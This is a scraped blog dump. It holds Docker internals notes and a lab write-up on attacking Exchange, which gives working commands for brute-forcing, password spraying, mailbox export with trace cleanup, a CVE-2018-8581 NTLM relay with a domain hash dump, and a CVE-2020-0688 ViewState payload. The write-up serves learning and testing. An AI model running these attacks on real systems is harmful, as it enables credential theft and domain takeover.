资源有一个唯一的 32 位 ID。 2.2.4 文件系统 - Mount mnt namespace 允许不同 namespace 的进程看到的文件结构不同，这样每个 namespace 中的进程所看到的文件目录就被隔离开了。 2.2.5 主机域名 - UTS 由于多个 container 是共享 OS 内核的，因而像 UTS 里的 os type 和 os release 等信息是不可能更改的，但是每个 container 可以有自己独立的 host name 和 domain name，以便于标识和区分（比如可以通过主机名来访问网络中的机器），这就是 UTS namespace 的作用。 2.2.6 用户控制 - USR 每个 container 可以有不同的 user 和 group id, 也就是说可以在 container 内部用 container 内部的用户执行程序而非 Host 上的用户。 ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:2:2","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["云原生安全"],"content":"2.3 linux 对 namespace 的操作方法 clone 在创建新进程的系统调用时，可以通过 flags 参数指定需要新建的 Namespace 类型。 clone 函数原型： int clone(int (*fn)(void *), void *child_stack, int flags, void *arg) sets 该系统调用可以让调用进程加入某个已经存在的 Namespace 中： int setns(int fd, int nstype) unshare 该系统调用可以将调用进程移动到新的 Namespace 下: int unshare(int flags) ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:2:3","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["云原生安全"],"content":"2.4 关于 namespace 的常用操作 查看当前系统的 namespace： lsns -t [type] 查看进程的 namespace： ls -la /proc/[pid]/ns/ 进入某 namespace 运行命令： nsenter -t [pid] -n ip addr ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:2:4","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["云原生安全"],"content":"3 Cgroup ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:3:0","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["云原生安全"],"content":"3.1 背景 Cgroups (Control Groups)是 Linux 下用于对一个或一组进程进行资源控制和监控的机制 可以对诸如 CPU 使用时间、内存、磁盘 I/O 等进程所需的资源进行限制; 不同资源的具体管理工作由相应的 Cgroup 子系统(Subsystem)来实现 ; 针对不同类型的资源限制，只要将限制策略在不同的的子系统上进行关联即可 ; Cgroups 在不同的系统资源管理子系统中以层级树(Hierarchy)的方式来组织管理：每个 Cgroup 都可以包含其他的子 Cgroup，因此子 Cgroup 能使用的资源除了受本 Cgroup 配置的资源参数限制，还受到父 Cgroup 设置的资源限制 。 Linux 内核代码中 Cgroups 的实现： ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:3:1","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["云原生安全"],"content":"3.2 类别 cgroups 实现了对资源的配额和度量 blkio：这个子系统设置限制每个块设备的输入输出控制。例如：磁盘，光盘以及 USB 等等 cpu：这个子系统使用调度程序为 cgroup 任务提供 CPU 的访问 cpuacct：产生 cgroup 任务的 CPU 资源报告 cpuset：如果是多核心的 CPU，这个子系统会为 cgroup 任务分配单独的 CPU 和内存 devices：允许或拒绝 cgroup 任务对设备的访问 freezer：暂停和恢复 cgroup 任务 memory：设置每个 cgroup 的内存限制以及产生内存资源报告 net_cls：标记每个网络包以供 cgroup 方便使用 ns：名称空间子系统 pid：进程标识子系统 3.2.1 cpu 子系统 cpu.shares：可出让的能获得 CPU 使用时间的相对值。 cpu.cfs_period_us：用来配置时间周期长度，单位为 us(微秒)。 cpu.cfs_quota_us：用来配置当前 Cgroup 在 cfs_period_us 时间内最多能使用的 CPU 时间数，单位为 us(微秒)。 cpu.stat：Cgroup 内的进程使用的 CPU 时间统计。 nr_periods：经过 cpu.cfs_period_us 的时间周期数量。 nr_throttled：在经过的周期内，有多少次因为进程在指定的时间周期内用光了配额时间而受到限制。 throttled_time：Cgroup 中的进程被限制使用 CPU 的总用时，单位是 ns(纳秒)。 示例 利用 cgroup cpu 子系统控制资源访问 在 cgroup cpu 子系统目录中创建目录结构： cd /sys/fs/cgroup/cpu mkdir cpudemo cd cpudemo 运行如下代码： package main func main() { go func(){ for { } }() for { } } 执行 top 查看 CPU 使用情况，CPU 占用 200%： 再通过 cgroup 限制 cpu： cd /sys/fs/cgroup/cpu/cpudemo # 把进程添加到 cgroup 进程配置组 echo ps -ef|grep poc|grep -v grep|awk '{print $2}' \u003e cgroup.procs # 设置 cpuquota echo 10000 \u003e cpu.cfs_quota_us 执行 top 查看 CPU 使用情况，CPU 占用变为10%： 删除分组： cgdelete -g cpu:cpudemo 3.2.2 Memory 子系统 memory.usage_in_bytes： cgroup 下进程使用的内存，包含 cgroup 及其子 cgroup 下的进程使用的内存 memory.max_usage_in_bytes： cgroup 下进程使用内存的最大值，包含子 cgroup 的内存使用量。 memory.limit_in_bytes 设置 Cgroup 下进程最多能使用的内存。如果设置为 -1，表示对该 cgroup 的内存使用不做限制。 memory.oom_control 设置是否在 Cgroup 中使用 OOM(Out of Memory)Killer，默认为使用。当属于该 cgroup 的进程使用的内存超过最大的限定值时，会立刻被 OOM Killer 处理。 ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:3:2","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["云原生安全"],"content":"4 文件系统 ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:4:0","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["云原生安全"],"content":"4.1 背景 docker 的创新点：Union FS 运用到文件系统中 将不同目录挂载到同一个虚拟文件系统下 (unite several directories into a single virtual filesystem) 的文件系统 支持为每一个成员目录(类似Git Branch)设定 readonly、readwrite 和 whiteoutable 权限 文件系统分层, 对 readonly 权限的 branch 可以逻辑上进行修改(增量地, 不影响 readonly 部分的) 通常 Union FS 有两个用途, 一方面可以将多个 disk 挂到同一个目录下，另一个更常用的就是将一个 readonly 的 branch 和一个 writeable 的 branch 联合在一起。 ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:4:1","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["云原生安全"],"content":"4.2 Docker 的文件系统 典型的 Linux 文件系统组成： Bootfs(boot file system) Bootloader - 引导加载 kernel， Kernel - 当 kernel 被加载到内存中后 umount bootfs。 rootfs (root file system) /dev，/proc，/bin，/etc 等标准目录和文件。 对于不同的 linux 发行版，bootfs 基本是一致的， 但 rootfs 会有差别。 4.2.1 启动过程的差异 Linux 的启动： 在启动后，首先将 rootfs 设置为 readonly，进行一系列检查，然后将其切换为readwrite供用户使用。 Docker 的启动： 初始化时也是将 rootfs 以 readonly 方式加载并检查，然而接下来利用 union mount 的方式将一个 readwrite 文件系统挂载在 readonly 的 rootfs 之上。并且允许再次将下层的 FS 设定为 readonly 并向上叠加。这样一组 readonly 和一个 writeable 的结构构成了一个 container 的运行时态，每一个 FS 被称作为一个 FS 层。 4.2.3 关于写操作 由于镜像具有共享特性，所以对容器可写层的操作需要依赖存储驱动提供的写时复制和用时分配机制，以此来支持对容器可写层的修改，进而提高对存储和内存资源的利用率。 写时复制 写时复制，即 Copy-on-Write。一个镜像可以被多个容器使用，但是不需要在内存和磁盘上做多个拷贝。在需要对镜像提供的文件进行修改时，该文件会从镜像的文件系统被复制到容器的可写层的文件系统进行修改， 而镜像里面的文件不会改变。不同容器对文件的修改都相互独立、互不影响。 用时分配 按需分配空间，而非提前分配，即当一个文件被创建出来后，才会分配空间。 4.2.4 容器存储驱动 2.4.5 OverlayFS OverlayFS 也是一种与 AUFS 类似的联合文件系统，同样属于文件级的存储驱动，包含了最初的 Overlay 和更新更稳定的 overlay2。 Overlay 只有两层：upper 层和 lower 层，Lower 层代表镜像层，upper 层代表容器可写层。 示例 mkdir upper lower merged work echo \"from lower\" \u003e lower/in_lower.txt echo \"from upper\" \u003e upper/in_upper.txt echo \"from lower\" \u003e lower/in_both.txt echo \"from upper\" \u003e upper/in_both.txt sudo mount -t overlay overlay -o lowerdir=`pwd`/lower,upperdir=`pwd`/upper,workdir=`pwd`/work `pwd`/merged cat merged/in_both.txt rm merged/in_both.txt rm merged/in_lower.txt rm merged/in_upper.txt ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:4:2","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["云原生安全"],"content":"5 网络 在 Docker 中提供了多种网络模式： Null(–net=None) 把容器放入独立的网络空间但不做任何网络配置; 用户需要通过运行 docker network 命令来完成网络配置。 Host 使用主机网络名空间，复用主机网络。 Container 重用其他容器的网络。 Bridge(–net=bridge) 使用 Linux 网桥和 iptables 提供容器互联，Docker 在每台主机上创建一个名叫 docker0 的网桥，通过 veth pair 来连接该主机的每一个 EndPoint。 ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:5:0","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["云原生安全"],"content":"5.1 默认模式 - 网桥和 NAT 创建 nginx 镜像，映射端口 8888:8888 docker run -p 8888:8888 -d nginx 显示网桥 brctl show nsenter 查看对应容器网络命名空间 主机上的 iptables 配置 iptables-save -t nat ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:5:1","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["云原生安全"],"content":"5.2 Null 模式 Null 模式是一个空实现，可以通过 Null 模式启动容器并在宿主机上通过命令为容器配置网络。 示例 创建 Null 模式容器，手动配置容器网络 ### create network ns ``` mkdir -p /var/run/netns find -L /var/run/netns -type l -delete ``` ### start nginx docker with non network mode ``` docker run --network=none -d nginx ``` ### check corresponding pid ``` docker ps|grep nginx docker inspect \u003ccontainerid\u003e|grep -i pid \"Pid\": 876884, \"PidMode\": \"\", \"PidsLimit\": null, ``` ### check network config for the container ``` nsenter -t 876884 -n ip a ``` ### link network namespace ``` export pid=876884 ln -s /proc/$pid/ns/net /var/run/netns/$pid ip netns list ``` ### check docker bridge on the host ``` brctl show ip a 4: docker0: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc noqueue state UP group default link/ether 02:42:35:40:d3:8b brd ff:ff:ff:ff:ff:ff inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0 valid_lft forever preferred_lft forever inet6 fe80::42:35ff:fe40:d38b/64 scope link valid_lft forever preferred_lft forever ``` ### create veth pair ``` ip link add A type veth peer name B ``` ### config A ``` brctl addif docker0 A ip link set A up ``` ### config B ``` SETIP=172.17.0.10 SETMASK=16 GATEWAY=172.17.0.1 ip link set B netns $pid ip netns exec $pid ip link set dev B name eth0 ip netns exec $pid ip link set eth0 up ip netns exec $pid ip addr add $SETIP/$SETMASK dev eth0 ip netns exec $pid ip route add default via $GATEWAY ``` ### check connectivity ``` curl 172.17.0.10 ``` ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:5:2","tags":["云原生安全","Docker"],"title":"Docker 核心技术","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["内网渗透"],"content":"Exchange 漏洞利用","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["域安全","内网渗透"],"title":"Exchange 漏洞利用","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["内网渗透"],"content":"Exchange 漏洞利用 ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["域安全","内网渗透"],"title":"Exchange 漏洞利用","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["内网渗透"],"content":"1 安装 安装过程可参考：微软官方文档和博客 整体分为三步： 满足前置条件 构建域中的结构 Setup.exe /PrepareSchema /IAcceptExchangeServerLicenseTerms Setup.exe /PAD /OrganizationName:PentestLab /IAcceptExchangeServerLicenseTerms Setup.exe 安装 ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["域安全","内网渗透"],"title":"Exchange 漏洞利用","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["内网渗透"],"content":"2 背景 Exchange Server 是微软公司的一套电子邮件服务组件，是个消息与协作系统。 简单而言，Exchange server 可以被用来构架应用于企业、学校的邮件系统。Exchange server 还是一个协作平台。在此基础上可以开发工作流，知识管理系统，Web 系统或者是其他消息系统。 ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:0","tags":["域安全","内网渗透"],"title":"Exchange 漏洞利用","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["内网渗透"],"content":"2.1 相关概念 2.1.1 邮件服务器角色 邮件服务器 该角色是提供托管邮箱、公共文件夹以及相关的消息数据（如地址列表）的后端组件，是必选的服务器角色。 客户端访问服务器 接收和处理来自于不同客户端的请求的中间层服务器角色，该角色服务器提供了对使用不同协议进行访问的支持，每个 Exchange 环境中至少需要部署一个客户端访问服务器，客户端访问服务器提供了对以下不同接口访问 Exchange 服务器的处理。 集线传输服务器 或称中心传输服务器，该服务器角色的核心服务就是 Microsoft Exchange Transport，负责处理 Mail Flow（这又是Exchange中的一大知识点，Exchange 管理员需要通过 MailFlow 实现邮件出站与进站配置）、对邮件进行路由、以及在 Exchange 组织中进行分发，该服务器角色处理所有发往属于本地邮箱的邮件和发往外部邮箱的邮件，并确保邮件发送者和接收者的地址被正确解析并执行特定策略（如邮件地址过滤、内容过滤、格式转换等），该服务器角色相当于一个邮件传输的中继站点，每个 Exchange 环境中至少需要部署一个集线传输服务器。 统一消息服务器 将专用交换机（private branch exchange/PBX） 和 Exchange Server 集成在一起，以允许邮箱用户可以在邮件中发送存储语音消息和传真消息，可选角色。 边缘消息服务器 该服务器角色作为专用服务器可以用于路由发往内部或外部的邮件，通常部署于网络边界并用于设置安全边界。其接受来自内部组织的邮件和来自外部可信服务器的邮件，然后应用特定的反垃圾邮件、反病毒策略，最后将通过策略筛选的邮件路由到内部的集线传输服务器，可选角色。 在 Exchange Server 2013 及以后的版本中，服务器角色精简为三个，分别是邮箱服务器、客户端访问服务器和边缘传输服务器，其中邮箱服务器角色和客户端访问服务器角色通常被安装在同一台服务器中。 2.1.2 客户端/远程访问接口和协议 OWA - Outlook Web App 客户端登录使用，地址通常为 http://DOAMIN/owa/ ECP - Exchange Administrative Center 管理中心，管理员用于管理组织中的 Exchange 的 Web 控制台，地址通常为 http://DOMAIN/ecp/ EWS - Exchange Web Service 网络管理接口。Exchange 提供了一套 API 编程接口可供开发者调用，用于访问 Exchange 服务器，与邮件、联系人、日历等功能进行交互和管理操作，在 Exchange Server 2007 中被提出。微软基于标准的 Web Service 开发 EWS，EWS 实现的客户端与服务端之间通过基于 HTTP 的 SOAP 交互。 ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:1","tags":["域安全","内网渗透"],"title":"Exchange 漏洞利用","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["内网渗透"],"content":"2.2 服务发现 2.2.1 基于端口扫描发现 25 端口 SMTP 指纹显示 Exchange smtpd 80 端口为 iis 443 端口开放 2.2.2 SPN 查询 setspn -T pentest.com -F -Q */* ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:2","tags":["域安全","内网渗透"],"title":"Exchange 漏洞利用","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["内网渗透"],"content":"2.3 exchange 基本操作 查看 MailBox 数据库 Add-pssnapin microsoft.exchange* Get-MailboxDatabase -server \"Exchange\" 查看指定用户邮箱使用信息 Get-Mailboxstatistics -identity administrator | Select DisplayName,ItemCount,TotalItemSize,LastLogonTime 查看全部用户邮箱使用信息 Get-Mailbox -ResultSize Unlimited | Get-MailboxStatistics | Sort-Object TotalItemSize ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:3","tags":["域安全","内网渗透"],"title":"Exchange 漏洞利用","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["内网渗透"],"content":"2.4 导出指定邮件 2.4.1 配置用户的导入、导出权限 查看用户权限 # 查看具有导出权限的用户 Get-ManagementRoleAssignment -role \"Mailbox Import Export\" | Format-List RoleAssigneeName 添加用户角色权限 New-ManagementRoleAssignment -Name \"Import Export_Domain Admins\" -User \"Administrator\" -Role \"Mailbox Import Export\" 删除用户权限 New-ManagementRoleAssignment \"Import Export_Domain Admins\" -Confirm:$false 设置网络共享文件夹 net share inetpub=c:\\inetpub /grant:everyone,full 导出邮件 New-MailboxExportRequest -Mailbox administrator -FilePath \\\\IP\\inetpub\\administrator.pst ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:4","tags":["域安全","内网渗透"],"title":"Exchange 漏洞利用","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["内网渗透"],"content":"2.4.2 清理痕迹 查看之前的导出记录 Get-MailboxExportRequest 将指定用户的已完成导出请求删除 Remove-MailboxExportRequest -Identify Administrator\\mailboxexport 将所有已完成导出的请求删除 Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:5","tags":["域安全","内网渗透"],"title":"Exchange 漏洞利用","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["内网渗透"],"content":"3 Exchange 在域中的权限 查看 Exchange 服务器的隶属关系，发现其属于：Exchange Security Groups 再跟进 CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=pentest,DC=lab 该组又隶属于 CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=pentest,DC=lab，该组包含通过管理服务代表用户运行 Exchange cmdlet 的 Exchange 服务器。其成员有权读取和修改所有 Windows 帐户和组。 简单来说，就是 Exchange 服务器有权限修改域内任意用户的 ACL。 因此，可以利用 Exchange 修改用户 ACL，然后在利用 Dcsync 来 dump hash。 ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:3:0","tags":["域安全","内网渗透"],"title":"Exchange 漏洞利用","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["内网渗透"],"content":"4 Exchange 接口利用 上文提到，Exchange 提供了多种客户端邮箱接口和服务接口，对于渗透测试人员而言，这些接口就是踏入 Exchange 内部的第一道关卡，提供服务的接口需要有效的用户凭证信息，显然，用户名与密码破解是摆在面前的第一个尝试。在企业域环境中，Exchange 与域服务集合，域用户账户密码就是 Exchange 邮箱的账户密码，因此，如果通过暴力破解等手段成功获取了邮箱用户密码，在通常情况下也就间接获得了域用户密码。 ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:4:0","tags":["域安全","内网渗透"],"title":"Exchange 漏洞利用","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["内网渗透"],"content":"4.1 利用自动发现服务进行暴力破解 Autodiscover 自动发现服务使用 Autodiscover.xml 配置文件来对用户进行自动设置，获取该自动配置文件需要用户认证，如访问 http://exchange.pentest.lab/Autodiscover/Autodiscover.xml 文件将提示需要认证，如下为认证通过，将获取到如下的 XML 文件内容： 利用这个接口，可以对邮箱账号做暴力破解。Ruler 提供了对 Exchange 的自动配置文件接口进行认证的暴力破解，通过配置线程数、间隔时间可以限制破解速度防止多次登陆失败触发告警或账户被封禁。 ./ruler --url https://172.16.147.4/autodiscover/autodiscover.xml --domain pentest.lab --insecure brute --users user.txt --passwords pass.txt --delay 0 --verbose ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:4:1","tags":["域安全","内网渗透"],"title":"Exchange 漏洞利用","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["内网渗透"],"content":"4.2 Password Spray password spray 同样是一种破解账户密码的方法，与常规的暴力破解方法不同的是，password spary 针对一批账户进行破解，每次对单个用户账户进行一次或少数次登陆尝试后换用下一个用户进行尝试，如此反复进行并间隔一定时间，以此方法躲避多次暴力破解的检测和账户锁定的风险。 mailsniper 提供分别针对 OWA 接口、EWS 接口和 ActiveSync 接口的 password spray。 Invoke-PasswordSprayEWS -ExchHostname exchange.pentest.lab -UserList .\\user.txt -Password 123456 -ExchangeVersion Exchange2016 ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:4:2","tags":["域安全","内网渗透"],"title":"Exchange 漏洞利用","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["内网渗透"],"content":"5 利用 Exchange 接管域控 ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:5:0","tags":["域安全","内网渗透"],"title":"Exchange 漏洞利用","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["内网渗透"],"content":"5.1 CVE-2018-8581 SSRF 漏洞 5.1.1 漏洞描述 Exchange 允许任意用户通过 EWS 接口来创建一个推送订阅（Push Subscription），并可以指定任意 URL 作为通知推送的目的地； 当触发推送时，Exchange 使用了 CredentialCache 类的 DefaultCredentials 属性，当使用 DefaultCredentials 时发出的 HTTP 请求将使用该权限发起 NTLM 认证； 在 EWS 请求中，通过在 Header 中使用 SerializedSecurityContext，指定 SID 可以实现身份伪装，从而以指定用户身份进行 EWS 调用操作。 即从 HTTP relay 到 LDAP 的 NTLM Relay 攻击。 5.1.2 受影响的系统版本 Exchange Server 2010 ~ Exchange Server 2016 5.1.3 漏洞复现 漏洞利用到两个工具： impacket PrivExchange 首先在本机启动 NTLM 中继，进入到 impacket 的 examples 目录执行 python2 ntlmrelayx.py -t ldap://pentest.lab --escalate-user hacker pentest.lab 是域的名称 --escalate-user 的参数是 Exchange 的普通权限用户名。 python2 privexchange.py -ah 172.16.147.1 172.16.147.4 -u hacker -p \"hack123aB\" -d pentest.lab -ah 参数指定攻击者 IP，在这里为 172.16.147.1 172.16.147.4 为 Exchange 服务器在域的名称或者IP地址 -u 指定需要提权的 Exchange 的普通权限用户名 -p指定 Exchange 的普通权限用户的密码 -d 指定域的名称 导出域内 hash： python2 secretsdump.py pentest.lab/hacker@pentest.lab -just-dc ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:5:1","tags":["域安全","内网渗透"],"title":"Exchange 漏洞利用","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["内网渗透"],"content":"5.2 CVE-2020-0688 反序列化漏洞 5.2.1 漏洞描述 与正常软件安装每次都会产生随机密钥不同，所有 Exchange Server 在安装后的 web.config 文件中都拥有相同的 validationKey 和 decryptionKey。这些密钥用于保证 ViewState 的安全性。 而 ViewState 是 ASP.NET Web 应用以序列化格式存储在客户机上的服务端数据。客户端通过 __VIEWSTATE 请求参数将这些数据返回给服务器。攻击者可以在 Exchange Control Panel web 应用上执行任意 .net 代码。 当攻击者通过各种手段获得一个可以访问 Exchange Control Panel （ECP）组件的用户账号密码时。攻击者可以在被攻击的 exchange 上执行任意代码，直接获取服务器权限。 具体原理可以参考：CVE-2020-0688的武器化与.net反序列化漏洞那些事 5.2.2 受影响的系统版本 Microsoft Exchange Server 2010 Service Pack 3 Microsoft Exchange Server 2013 Microsoft Exchange Server 2016 Microsoft Exchange Server 2019 5.2.3 漏洞复现 5.2.3.1 前提 首先，需要获取 4 个参数： validationkey 该参数为默认，为漏洞产生的原因 CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF validationalg 默认 SHA1 generator viewstateuserkey 在这四个变量中，前两个为默认固定，viewstateuserkey 和 generator 的值需要从经过身份验证的 session 中收集。viewstateuserkey 可以从 ASP.NE T的 _SessionID cookie 中获取，而 generator 可以在一个隐藏字段 __VIEWSTATEGENERATOR 中找到。 5.2.3.2 参数获取 在正常登录后访问 /ecp/default.aspx 页面。使用 burpsuite 抓包发 repeater，找到登录时 /ecp/default.aspx 的原始响应。 找到 ASP.NET_SessionId 的 cookie： ASP.NET_SessionId=d7d6614a-4959-4989-a3d1-27e6efd8875d 搜索 __VIEWSTATEGENERATOR 获取字段值： B97B4E27 5.2.3.3 生成 payload 需要用到 ysoserial.net 生成执行程序的 payload ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"calc.exe\" --validationalg=\"SHA1\" --validationkey=\"CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF\" --generator=\"B97B4E27\" --viewstateuserkey=\"d7d6614a-4959-4989-a3d1-27e6efd8875d\" --isdebug --islegacy 得到： /wEylAcAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC2BTw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCi